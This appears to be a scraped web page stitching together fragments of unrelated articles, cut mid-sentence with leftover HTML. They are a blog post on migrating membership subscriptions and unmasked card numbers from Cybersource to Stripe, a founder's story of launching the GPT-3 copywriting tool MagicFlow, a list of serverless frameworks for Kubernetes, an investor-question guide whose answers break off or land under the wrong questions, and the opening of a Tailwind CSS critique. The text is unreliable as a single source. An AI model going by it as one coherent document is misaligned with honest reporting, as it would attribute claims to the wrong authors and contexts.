<p>The early investment in the plugin was key to getting support from MITCNC leadership and MITAA staff for this migration. A demo on our staging site provided a tangible experience these stakeholders could play with and compare to the iModules experience. Since I relied on Stripe to handle much of the UX, I only had to focus on building a single page where new members can select a membership level, or existing members can click through to the customer portal.</p>

<p>Writing the code and modeling the memberships was the easy part! Migrating card data from Cybersource to Stripe was far more difficult. I inquired within Stripe to learn more about what I should expect from the migration process. I was disappointed, but not surprised, to learn that Cybersource tends not to play nicely when users want to migrate to a different payment processor. They take a long time to send data, and the data is often incomplete. I opened support requests with Cybersource and further learned the process would take six to eight weeks and cost $500. Given the uncertainty of this process, I exercised an option I was surprised Cybersource offered: transferring unmasked account numbers via API.</p>

<p>Cybersource gave us the option to retrieve account numbers via API. Stripe gave us the option to transmit account numbers via API. After weighing the risks (e.g., a malicious actor gets access to the card numbers) against our need to maintain revenue and offer a better user experience, we decided to proceed with this option.</p>

<p>My one rule for this migration was: account numbers are never stored to disk. No CSVs. No databases. Card numbers are read from Cybersource’s API and immediately transmitted via Stripe’s API (both utilizing TLS). My laptop was physically secure, so there was minimal risk of someone (a) knowing I was running the migration script, (b) breaking into my lobby and elevator, (c) breaking down my apartment door, and (d) freezing my laptop so they could read the DRAM contents and steal a few account numbers. (Note: If you are that desperate for money, just ask for some. I am happy to give you some money and spare the insurance deductible.)</p>

<p>I wish I could say the migration script was as simple as making a couple API calls. Unfortunately Cybersource doesn’t make it as simple to get subscription data. Stripe has a list endpoint that allows me to retrieve a paginated list of all subscriptions. Easy. Cybersource doesn’t have such an API, and requires two separate identifiers—merchant reference code and subscription ID—to retrieve a single subscription. Neither of these identifiers is available in the data I am able to export from iModules, but they are available in daily Cybersource transaction reports.</p>

<p>The first script I wrote downloaded a year of daily transaction reports by making one API call per day. I distilled the logs solely to those associated with subscriptions, filtering out one-off transactions, and stored the data as both a CSV and in a SQLite database. It is important to note that this data did <em>not</em> include account data, hence my willingness to store it on disk. I originally stored the data solely as a CSV that was later loaded by a separate migration script. However, I later realized that I needed the ability to transact on the data to group related transactions (e.g., a member renewed their membership mid-year), and to keep track of which subscriptions had been migrated. I opted to use SQLite for this purpose since my dataset was small (&lt;2000 rows).</p>

<p>The actual migration script is pretty straightforward:</p>

<ol>
  <li>Read a row from the database.</li>
  <li>Pull the account data from Cybersource.</li>
  <li>Determine the Stripe product/price based on the subscription amount.</li>
  <li>Get, or create, a customer at Stripe using the email address as a primary key.</li>
  <li>Get, or create, a payment method at Stripe using the card brand and last four digits as a compound primary key.</li>
  <li>Get, or create, the subscription from Stripe using the Cybersource subscription ID (stored in Stripe metadata) as a primary key.</li>
  <li>Write the Stripe IDs to the database row.</li>
  <li>Cancel the Cybersource subscription.</li>
</ol>

<p>Since the members had already paid for their memberships, the Stripe subscriptions were created with trials that ended at the next rollover point. This ensured members were not double-charged. In hindsight, I could have achieved the same result by initially setting the subscription to send an invoice (instead of charge automatically), immediately mark the invoice as paid, and updating the subscription to charge automatically. However, this extra effort would not have served much of a purpose for us since we don’t normally rely on trials. If your business model relies on trials, and you want the Stripe dashboard conversion/retention metrics to be accurate, I recommend the multi-step approach over trials.</p>

<p>The script was initially run against Stripe’s test environment, revealing a few issues I needed to resolve:</p>

<ol>
  <li><strong>Expired cards for active subscriptions.</strong> If a card expired before it could be migrated to Stripe, the script creates the subscription anyway. The member will be notified when the subscription renewal is approaching, and can update payment details before then.</li>
  <li><strong>Multi-year subscriptions.</strong> Some of our members managed to pay for multiple years of membership in advance, resulting in a need for trials that ended well into 2023. Stripe only supports trials up to two years in length. Given we had about 10-15 such memberships, I opted to resolve them manually by setting up <a href="https://stripe.com/docs/billing/subscriptions/subscription-schedules">subscription schedules</a> in the Stripe Dashboard. At the end of two years, another trial will be created for the remainder of the pre-paid period. After that time, the subscription will cycle to a paid subscription like the others.</li>
</ol>

<p>We have less than 2000 subscriptions, so the bulk of the migration was done in a few hours. I spent a few more days, off-and-on, tracking down one-off issues and re-running the scripts to migrate subscriptions that were created between my initial data download and disabling the old sign-up form. This is where I learned an interesting fact: Cybersource includes read transactions in their daily transaction logs. If you happen to load 2000 subscriptions via API one day, a record of each of the 2000 API calls will be in the transaction logs for that day. Subsequent downloads of the subscription metadata took much longer than the initial one!</p>

<p>The migration scripts are <a href="https://gitlab.com/mitcnc/Cybersource-to-stripe">available on GitLab</a>. They are still somewhat hard-coded for MITCNC purposes, but should serve as a decent starting point for others. This work is available without warranty, and is not endorsed by MIT or Stripe. As stated at the beginning of this post, make sure you understand the risks before you attempt a similar migration.</p>



<p>Some of these are just good habits. Others are mistakes I made with this migration.</p>

<p><strong>Utilize the test environment.</strong> Stripe’s test environment made it easy for me to test my code without fear accidentally charging a member. I did have to modify my script to create payment methods with the test card number, however, since the test environment does not accept real card numbers.</p>

<p>**Build a prototype/MVP. **A couple hours on a decent demo can save even more time in back-and-forth emails and meetings, and help gain support for a migration by showing stakeholders some of the benefits of the migration.</p>

<p><strong>Work with stakeholders to ensure you understand all subscription types/behaviors.</strong> This is where I messed up. I knew about the different levels, free lifetime memberships, and discounts for students. I did not know that we also offer a discount for alumni who are current students at other institutions. Modeling this is pretty straightforward, but our administrator will need to manually create these subscriptions in the Stripe dashboard until I update our plugin(s) to handle these discounts.</p>

<p><strong>Consolidate your data sources.</strong> I had a record of memberships exported from iModules to my data warehouse in BigQuery. This table included one-time payments (e.g., non-renewing membership), subscriptions, and manually-created student and lifetime memberships. I should have used this one table as my source of truth, and written a single script to migrate subscriptions. Instead I was laser focused on recurring memberships, and ended up writing one script that dealt with Cybersource subscriptions, one for lifetime memberships, and another for non-recurring memberships. Additionally, I spent a bit of time syncing user data back to WordPress <em>after</em> the migration when it should have been done first.</p>

<p>If I were to repeat this procedure, I would do the following:</p>

<ol>
  <li>Ensure all users are recorded in our authentication service—the WordPress user table.</li>
  <li>Sync the users to Stripe customers.</li>
  <li>Sync WordPress, Stripe, and iModules data to the data warehouse—BigQuery.</li>
  <li>Write a …</li></ol></div></div></div></div>

We either had to settle with the sub-standard copy we wrote ourselves (hey we are not copywriters) or hire a copywriter, which was always an expensive option.</p><p>We wished there was a tool that could take the pain out of creating great copy for our landing pages and other content.</p><p>Coincidentally, we had been playing around with GPT-3 for a few weeks.</p><blockquote><p>GPT-3 is a state-of-the-art generative language model that can learn the patterns in text and then generate new text based on these patterns.</p></blockquote><p>It got us thinking, “can we use GPT-3 to generate landing pages from short descriptions of the product/service?“.</p><p>After a few days of tinkering with GPT-3, we were able to generate pretty good landing pages from just a few lines of input.</p><h2 id="2-the-mvp"><a href="#2-the-mvp"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>2. The MVP</h2><p>At this point, we were convinced that we were onto something.</p><p>We decided to build an MVP and test if our assumptions were correct.</p><p>Using my <a href="https://tldrthis.com/" target="_blank">previous app’s</a> boilerplate code, we were able to build an MVP within 2-3 hours. All the MVP did was to take a short description of the respective product/service as input, pass that through OpenAI’s API, parse the results from the API and replace the relevant sections in a sample landing page template.</p><p>With just a few lines of code, we were able to put together a simple MVP.</p><p>Then, we recorded a video demo of the MVP using QuickTime, added some animated text using Canva, picked up a nice non-copyrighted audio track from YouTube and put it all together using iMovie.</p><div> <p> <iframe title="" src="https://www.youtube.com/embed/CMA-ws91TWg?rel=0" allowfullscreen=""></iframe> </p> </div><p>Finally, for our landing page, we used a cool template from <a href="https://cruip.com/" target="_blank">cruip.com</a> and got the images for the page from <a href="https://undraw.co/" target="_blank">Undraw.co</a>.</p><p>We used our own MVP to generate the copy for all the sections (header, features, and CTA) of our landing page.</p><p><img src="https://images.ctfassets.net/eevty2ochusg/5xyoWJcCRZJux7dBW9CKaE/2f5443bab47285a72b2d9a1854c0f1c4/MagicFlow_Landing_Page.jpg" alt="MagicFlow Landing Page"></p><p>We also used the <a href="https://getwaitlist.com/" target="_blank">Waitlist API</a> to quickly set up a waiting list for early access to the product.</p><p>All the heavy lifting was done in just a few hours.</p><h2 id="3-the-launch-plan"><a href="#3-the-launch-plan"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>3. The Launch Plan</h2><p>The next morning, we launched on <a href="https://www.producthunt.com/posts/magic-flow" target="_blank">Product Hunt</a>.</p><p>We were super excited, but also nervous.</p><p>We were expecting high traffic on Product Hunt but had no clue whether people will like our idea or not.</p><p>Surprisingly, we were able to get our product on the features page of Product Hunt within an hour of launch.</p><p>In the next hour, we were able to get to the #1 spot.</p><p>We were ecstatic!</p><p>But then, in the next hour, the Product Hunt team told us that they are going to un-feature the product since it’s pre-launch.</p><p>We were a bit disappointed but didn’t get discouraged. We decided to continue sharing the product on more platforms.</p><p>In the next few days, we posted the product on Reddit and Twitter and got a few more signups.</p><p>Given the waitlist had gamification built-in, users could jump 5 places up the waiting list by sharing their referral link. Each user they refer to moves them 5 places up the waiting list. This helped with the initial traction.</p><p><img src="https://images.ctfassets.net/eevty2ochusg/2NLKdjbR7bmsLD9ot34u8k/c49a9fd3dffd39be48f2830dbd78ebe5/MagicFlow_Waitlist.jpg" alt="MagicFlow Waitlist"></p><p>Within one week, we were able to get 1000+ signups.</p><p>Out of these signups, about a third of them came from Product Hunt, about 200 came from Reddit and Twitter, and the remaining came from word of mouth promotion.</p><p>Overall, we are very happy with the initial traction.</p><h2 id="4-the-learnings"><a href="#4-the-learnings"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>4. The Learnings</h2><p>There are a few learnings that we want to share with you:</p><p><strong>1. Validate the idea before spending time on building the product</strong></p><p>When we decided to build MagicFlow, we had no idea if our idea had any potential.</p><p>We just knew that we needed a product that would help us write better copy for our landing pages quickly.</p><p>By spending a couple of hours on building and launching the MVP, we were able to validate the idea.</p><p><strong>2. Use tools that you are already familiar with and have a good grasp of</strong></p><p>We reused our previous app’s boilerplate code to build an MVP within 2-3 hours. Most of the tools that we used in this project were tools that we were already familiar with.</p><p>Had we chosen a relatively new, fancier set of technology, it would have taken us many days to build the MVP.</p><p><strong>3. Sign up potential users before building the product</strong></p><p>We implemented a waiting list system to attract and capture the initial user base. </p><p>These users were our first customers. We used their feedback to build the initial version of our product, iterate it and make it better.</p><p><strong>4. Post on more than one platform to increase your chances of getting traction</strong></p><p>While Product Hunt is the most popular platform, we also posted on Reddit and Twitter.</p><p>By posting on more than one platform, we were able to get a much wider reach.</p><hr><p>That’s it for this post, folks. Hope you enjoyed reading it (despite my bad writing skills).</p><p>If you have any questions, feel free to comment below or <a href="https://twitter.com/SamanyouGarg" target="_blank">ping me on Twitter</a>.</p><p>Please <a href="https://twitter.com/SamanyouGarg" target="_blank">follow me on Twitter</a> if you would like to receive the latest updates.</p><p><strong>If you want to write better marketing content, check out <a href="https://magicflow.io/" target="_blank">MagicFlow</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>As infrastructure is moving towards a cloud-hosted environment, <a href="https://thechief.io/c/editorial/top-serverless-platforms-follow-2020/">Serverless</a> Architecture has become more than a <a href="https://thechief.io/c/editorial/top-devops-trends-watch-2020/">buzz</a> word.</p><div><p><a href="https://thechief.io/c/editorial/pitfalls-serverless-computing/">Serverless</a> is one of the significant trends of the moment in software development and deployment. A promising technology, <a href="https://thechief.io/c/category/serverless/">Serverless Computing</a> is developing very quickly in companies. </p><p>Other rising technologies are having the same great potential, like <a href="https://thechief.io/c/cloudplex/kubernetes-busy-developer/">Kubernetes</a>. But who says that you must choose between Kubernetes and Serverless for your next application while you can deploy efficient and stable Serverless applications on Kubernetes? </p><p>In this blog post, we are going to discover some tools that allow you to run your <b>Serverless functions on a Kubernetes cluster</b>. </p></div></div><div><section><div><h2>Fission</h2><p><a href="https://fission.io/">Fission</a> is an open source serverless framework released by Platform9 and is based on Kubernetes. It allows developers to concentrate on coding and takes care of the plumbing with Kubernetes. It offers language flexibility and supports HTTP events and can be set-up easily.</p><h2>Knative</h2><p><a href="https://knative.dev/">Knative</a> is an open source initiative that combines Kubernetes with Serverless and is largely supported by Google engineers. It provides a platform to build serverless solutions on top of Kubernetes. Knative supports autoscaling, in-cluster builds, and eventing framework for cloud-native applications on Kubernetes.</p><h2>Kubeless</h2><p><a href="https://kubeless.io/">Kubeless</a> is an open source serverless framework that supports functions and is designed to be deployed on a Kubernetes cluster. It supports Python, Node.js, Ruby, PHP, Golang, .NET, Ballerina, and custom runtimes. Triggers are supported through the Kafka messaging system and HTTP events. Monitoring is supported through Prometheus. The drawback of Kubeless is that it is not adequately represented by a developer community or documentation.</p><h2>OpenFaaS</h2><p><a href="https://docs.openfaas.com/">OpenFaas</a> a brainchild of Alex Ellis, is an open source serverless platform that supports serverless functions deployed on Docker Swarm or Kubernetes. The code can be written in any language inside the containerized functions. It is easy to set up as it offers a default configuration but is also customizable. There is no limit on runtime for functions. Since the application is containerized, it offers high portability.</p><h2>OpenWhisk</h2><p><a href="https://www.ibm.com/cloud/functions">IBM OpenWhisk</a> is based on Apache OpenWhisk and supports multiple languages like Node.js, Swift, Java, PHP, Python, and additional languages via <a href="https://thechief.io/c/editorial/ultimate-docker-cheat-sheet/">Docker</a> containers. It integrates with other services like IBM Cloudant database, IBM EventStreams, and IBM Watson APIs, which provides natural language processing and AI capabilities. Monitoring and Logging capabilities are provided through IBM Cloud Monitoring. There is no time limit on single function invocation, which makes it suitable for long-time invocation.</p><h2>Nuclio</h2><p><a href="https://nuclio.io/">Nuclio</a> is another open source serverless platform targeted at applications that require high data-processing capabilities as it supports persistent connections. It can run over Docker or Kubernetes and is portable without any vendor lock-in. It supports multiple event sources like HTTP Events, Kinesis, Kafka, Rabbit MQ etc.. and multiple log destinations.</p><h2>Fn Project</h2><p><a href="https://fnproject.io/">Fn Project</a> supported by Oracle provides a way to create and run serverless functions on Docker. They can be tested and run locally or on any cloud environment with a Docker engine. The runtime itself supports all languages, but deeper functionality is available for Java, Go, Python, and Ruby.</p><h2>IronFunctions</h2><p><a href="https://github.com/iron-io/functions">IronFunctions</a> is an open source Functions as a Service (FaaS) platform that you can run anywhere. This platform is compatible with Kubernetes, Docker Swarm, and Mesosphere. Iron is also currently hosting Functions for select customers. </p></div></section><section><div><h2>Conclusion</h2><p>Mixing Kubernetes and Serverless is taking advantage of the speed of prototyping Serverless applications and the performance offered by Kubernetes. However, each technology brings possible downsides if it is not well handled. The <a href="https://thechief.io/c/editorial/pitfalls-serverless-computing/">pitfalls of Serverless</a> and <a href="https://thechief.io/c/editorial/4-kubernetes-failure-stories-learn/">Kubernetes Failure Stories</a> can illustrate this. </p></div></section></div></div>]]>

The answer to this questions should be one that you know, and you can provide with certainty and authentic conviction. Make use of the elevator pitch, excite the investor with an engaging answer that sparks their curiosity to learn more.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Why did you pick this idea to work on?</p> </div>  </div> <div> <div> <div data-id="pwj5nk" data-type="inner-row"> <div data-id="pzojfp" data-type="column"> <div data-id="pw9bdv" data-type="heading">  <div> <p>Again, keep your questions short and to the point during investor meetings. This is a great opportunity to explain your motivation as to why you are working on this. Make sure to convey clear reasons and back them up with some domain expertise or background experience that makes you the perfect team to work on this idea. don’t forget to express your enthusiasm and excitement your cary within to be bring this idea to life. Investors like to hear that you are passionate about what you do.</p> </div> </div> </div> </div> </div> </div> </div> <div>  <div> <div> <div data-id="pfrdpb" data-type="inner-row"> <div data-id="p76drh" data-type="column"> <div data-id="pcqqvd" data-type="heading">  <div> <p>The investor likes to know if you can prove that you have a truly unique value proposition. You have been working on this idea for a while now and did your research, you should definitely be able to explain properly how you differ from others in the market. First of all, express how you and your team are different than any other team to execute on this. Explain the in-house expertise, motivation, and amazing team collaboration to achieve results. Second, you found a unique solution to the customer’s problem through innovative (proprietary) technology, product development, or service offering unlike anything in the market today.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What big problem do you solve?</p> </div>  </div> <div> <div> <div data-id="p5m277" data-type="inner-row"> <div data-id="p729kq" data-type="column"> <div data-id="pwq1v6" data-type="heading">  <div> <p>When an investor asks you this question, get ready to emphasize clearly that the problem your solving is HUGE! You are on a mission to solve a problem that will change the way people do certain things and it will have a tremendous impact. Make sure to state some short key facts why this true so you’re not just blowing this up. The reason why you want to answer it in this way, is because the bigger the problem, the more likely people are willing to pay.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What is unique about the company?</p> </div>  </div> <div> <div> <div data-id="pswh74" data-type="inner-row"> <div data-id="pt3l1o" data-type="column"> <div data-id="prc0cw" data-type="heading">  <div> <p>Although this question ties in closely with “how are you different?” they are not entirely the same question. This is your opportunity to really focus on what makes your company unique. It might be your proprietary innovative technology that makes your company unique. It could be that your team has amazing set of skills unlike any other team. Or, it could be that your company strategized towards problems and opportunities just a bit different than others. Focus, focus, focus – let them know that <i>you know</i> what is unique about your company.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Why is your business defensible?</p> </div>  </div> <div> <div> <div data-id="pc026o" data-type="inner-row"> <div data-id="pg1ie5" data-type="column"> <div data-id="pf29xp" data-type="heading">  <div> <p>The investor is looking for some reassurance that your business and product/service is not one that will be copied easily. You defensibility could be your go-to-market strategy or scaling strategy. Defensibility could also come from the team you assemble or the technology you are building. Explain how your business is one that can’t be easily copied and executed. Even if the idea can be copied by another company, they will not have the team you have to execute successfully. There is and should always be a clear confident answer to this question.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What do you understand that others don’t?</p> </div>  </div> <div> <div> <div data-id="p4hpcs" data-type="inner-row"> <div data-id="pu9ezu" data-type="column"> <div data-id="pnji6p" data-type="heading">  <div> <p>You certainly did your market research, spoke to customers, or have a background in a certain industry or field that gave you an understanding of the problem or opportunity you are working on.

You’re unique, different, and will do things better. However, this is great moment to give an example of a company you admire (wether in your field or not). It shows that you have a vision for a certain strategy, company culture, or execution. While explaining your likes about the other company, make sure to incorporate some clear examples of what you will adopt and do differently.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Who do you least want to be like?</p> </div>  </div> <div> <div> <div data-id="p11f39" data-type="inner-row"> <div data-id="pvu318" data-type="column"> <div data-id="pdd7ly" data-type="heading"> <div> <p>Don’t answer this question by badmouthing another company.

If you’re profitable you share an exact figure of profit you made. If you’re not profitable, don’t turn this answer into a defensive statement as to why not. Instead, give a short answer as to when you expect to become profitable and why (letters of intent, speaking with clients that will convert soon etc…). However, do not lie or give vague answers as to when you expect profits. This will only complicate things later and will make you look like you failed when you don’t reach those conversions. It’s okay to mention some positive expectations, but, try to stay realistic.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>How do you define success for you and your company?</p> </div>  </div> <div> <div> <div data-id="pc94f2" data-type="inner-row"> <div data-id="pt4kbo" data-type="column"> <div data-id="pxdwlf" data-type="heading">  <div> <p>Investors want to invest in founders who are focused on a disruptive, game-changing products/services/ideas. Some founders are more than happy to exit early and cash-in. Other founders want to push their business to the absolute limit and become the next Bill Gates, Steven Jobs, or Elon Musk. Make sure to think about this question carefully before answering. You should know your vision and dream – don’t be afraid to dream big (but stay realistic).</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What’s an impressive thing you have done?</p> </div>  </div> <div> <div> <div data-id="pw0fvu" data-type="inner-row"> <div data-id="pr3ptt" data-type="column"> <div data-id="puyuef" data-type="heading">  <div> <p>Use this as an opportunity to hone in on an achievement that that may wow the investor.

We all make mistakes, we live, and we learn. Use this as an opportunity to explain how lessons learned were translated into actions. Maybe you had a hit and miss with a product feature or communication failure with a client. Give a clear short example of what happened, how you overcame the “worst thing”, and put those learnings back into your team, product, or management.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>How is the company currently organized?</p> </div>  </div> <div> <div> <div data-id="p46rih" data-type="inner-row"> <div data-id="pa7sei" data-type="column"> <div data-id="pn11t5" data-type="heading">  <div> <p>Do you have a corporate pyramid hierarchy? Or are you running your business a bit more flat? This should be a simple answer in which you explain the structure of your management, team, and/or advisors. Maybe you can even give a short example of how communication works in the company and the culture of collaboration. Don’t forget to mention how decisions are made, who is involved in the decision making process, and why you chose this approach. Finally, are you all working from the same office or do you have a remote team. Simply give a short summary of how your company is organized.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What does the cap-table look like?</p> </div>  </div> <div> <div> <div data-id="pyxv9z" data-type="inner-row"> <div data-id="p5ncod" data-type="column"> <div data-id="pso2hl" data-type="heading">  <div> <p>The cleaner the better. Share your screen during your meeting to visualize if possible. Always have a cap-table overview ready and make sure you know exactly how to present and explain the cap-table.

Did one person bring in more experience, money, or a valuable network that lead to a higher percentage? Do you have a founders agreement that covers your equity distribution and vesting? And often forgotten, do you have any follow-up agreements that may change the equity distribution among founders when certain milestones are reached. It is not always said that once equity is distributed between founders that it remains that way (tip to look into if you’re just starting).</p> </div> </div> </div> </div> </div> </div> </div> <div>  <div> <div> <div data-id="p8vwei" data-type="inner-row"> <div data-id="plu81n" data-type="column"> <div data-id="p6eya0" data-type="heading">  <div> <p>Who registered the company? Is held privately, on your holding, or did someone else register it for you? Often this question is asked to see if you are the legal founder of the company to avoid any issues later.

Other’s might only invest in startups from Asia (taxes/market knowledge). It has to make sense for your company to incorporate in another country. You can always return the question to the investor and ask <i>We have not yet discussed that option internally, but why do you ask?</i>. If the response is “we only invest in companies incorporated in [insert country]” – your follow-up question should be <i> if I hear your correctly, you would be willing to invest in our startup if we are located in [insert country]?</i>. Always confirm if that would tick of one of the criteria boxes.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Is there an existing board or advisors?</p> </div>  </div> <div> <div> <div data-id="ppl5nu" data-type="inner-row"> <div data-id="p326r8" data-type="column"> <div data-id="p2f2of" data-type="heading"> <div> <p>Pre-seed or seed funded companies often do not have a board.

Here is the thing though: <strong>Tailwind is awesome <em>despite</em> using atomic CSS, not because of it</strong>.</p><p font-family="system" color="#333" font-size="18px">Hear me out.</p><h3 font-family="system" font-size="4" font-weight="bold">The key to Tailwind</h3><p font-family="system" color="#333" font-size="18px">We have had <a target="_blank" rel="noopener" to="https://github.com/basscss/basscss/commit/ed65eec980c4899d930f2c293f70bc619573456f" href="https://github.com/basscss/basscss/commit/ed65eec980c4899d930f2c293f70bc619573456f" color="blue">atomic</a> <a target="_blank" rel="noopener" to="https://github.com/tachyons-css/tachyons/commit/7f27af8d52d8ed03615e23a9db5ff33fc8153729" href="https://github.com/tachyons-css/tachyons/commit/7f27af8d52d8ed03615e23a9db5ff33fc8153729" color="blue">CSS</a> <a target="_blank" rel="noopener" to="https://medium.com/buzzfeed-design/introducing-solid-1c16b1bf4868" href="https://medium.com/buzzfeed-design/introducing-solid-1c16b1bf4868" color="blue">frameworks</a> for almost a decade but none of them have been as critically acclaimed as Tailwind. What makes it different?</p><p font-family="system" color="#333" font-size="18px"><strong>The key to Tailwind's popularity is the painstakingly constructed system of design tokens at the core of the framework.</strong> The system's carefully selected constraints give developers <em>just</em> the right guardrails. They make it obvious whether a choice is good or bad by offering only discrete steps.</p><p font-family="system" color="#333" font-size="18px">This does require some design <em>taste</em>, but most frontend engineers I know have developed that over the years of building user interfaces. Tailwind's system lets them turn that taste into implementation without requiring a lot of design <em>skill</em> — it helps them cross <a target="_blank" rel="noopener" to="https://vimeo.com/85040589" href="https://vimeo.com/85040589" color="blue">"the gap"</a>.</p><p font-family="system" color="#333" font-size="18px">Tailwind's system is a masterpiece of design. I, and many other developers all around the world, feel empowered by and love it.</p><h3 font-family="system" font-size="4" font-weight="bold">The problem with Tailwind</h3><p font-family="system" color="#333" font-size="18px">The atomic CSS framework is basically a delivery mechanism that allows developers to apply the system to their UIs. It's undeniable that it has a fantastic developer experience: once you get used to the custom vocabulary you feel like you are flying!</p><ul><li><p font-family="system" color="#333" font-size="18px">Users still have to add a separate setup for the <a target="_blank" rel="noopener" to="https://twitter.com/kentcdodds/status/1240868842361913347" href="https://twitter.com/kentcdodds/status/1240868842361913347" color="blue">custom CSS they inevitably need</a> (coined <a target="_blank" rel="noopener" to="https://twitter.com/samselikoff/status/1251637275412357121" href="https://twitter.com/samselikoff/status/1251637275412357121" color="blue">"bailwind"</a>). You cannot get by on <em>just</em> Tailwind in the real world. Not having a dedicated place for custom styles in the same system can cause maintenance issues down the line.</p></li><li><p font-family="system" color="#333" font-size="18px">Due to file-size considerations, <a target="_blank" rel="noopener" to="https://tailwindcss.com/docs/hover-focus-and-other-states#default-variants-reference" href="https://tailwindcss.com/docs/hover-focus-and-other-states#default-variants-reference" color="blue">Tailwind does not include all variants</a> (e.g. <code font-size="2">hover:</code>, <code font-size="2">sm:</code>) for all utilities by default. It leaves it to you to manually configure which ones you need for every single CSS property.</p></li><li><p font-family="system" color="#333" font-size="18px">Atomic CSS is not ideal for performance. No tooling can extract the <em>per-page</em> critical CSS, so you end up shipping more CSS to the browser than necessary. The bigger and more dynamic the app, the more unnecessary code you will 